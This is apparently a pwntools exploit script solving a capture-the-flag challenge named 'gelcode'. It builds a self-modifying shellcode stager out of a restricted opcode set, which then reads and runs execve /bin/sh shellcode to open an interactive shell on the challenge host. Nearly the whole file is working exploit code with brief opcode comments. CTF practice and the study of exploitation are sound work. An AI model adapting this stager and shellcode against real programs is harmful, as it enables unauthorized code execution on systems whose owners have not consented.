from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chal'
HOST = 'gelcode.hsc.tf'
PORT = 1337

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

_64_SHELLCODE = "\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

r = start()
if args.D:
	debug(r, [0x1308])

# 0x6a: push 0
# 0x6a: push 0
# 0x52: push rdx
# 0x68: push 0xf0f
# 0x5a: pop rdx
# 0x5e: pop rsi
# 0x5f: pop rdi
# 0x58: pop rax
# syscall


# opcodes we use
# \x04\xZZ : add al, ZZ
# \x00\x05\x00\x00\x00\x00 : add byte ptr[rip], al
# \x0f\x05 : syscall

payload = ''
# rax 0x6a
payload += '\x04\x0f' * 7
payload += '\x04\x01'

# push 0
payload += '\x00\x05\x00\x00\x00\x00'
payload += '\xff\x00'

# push 0
payload += '\x00\x05\x00\x00\x00\x00'
payload += '\xff\x00'

# rax 0x52
payload += '\x04\x0f' * 15
payload += '\x04\x07'

# push rdx
payload += '\x00\x05\x00\x00\x00\x00'
payload += '\xff'

# rax 0x68
payload += '\x04\x0f'
payload += '\x04\x07'

# push 0xf0f
payload += '\x00\x05\x00\x00\x00\x00'
payload += '\xff\x0f\x0f\x00\x00'

# rax 0x5a
payload += '\x04\x0f' * 16
payload += '\x04\x02'

# pop rdx
payload += '\x00\x05\x00\x00\x00\x00'
payload += '\xff'

# rax 0x5e
payload += '\x04\x04'

# pop rsi
payload += '\x00\x05\x00\x00\x00\x00'
payload += '\xff'

# rax 0x5f
payload += '\x04\x01'

# pop rdi
payload += '\x00\x05\x00\x00\x00\x00'
payload += '\xff'

# rax 0x58
payload += '\x04\x0f' * 16
payload += '\x04\x09'

# pop rax
payload += '\x00\x05\x00\x00\x00\x00'
payload += '\xff'

payload += '\x0f\x05'
length = len(payload)

payload = payload.ljust(1000, '\x11')
r.sendafter('.\n', payload)

r.send('\x90' * length + _64_SHELLCODE)

r.interactive()
r.close()
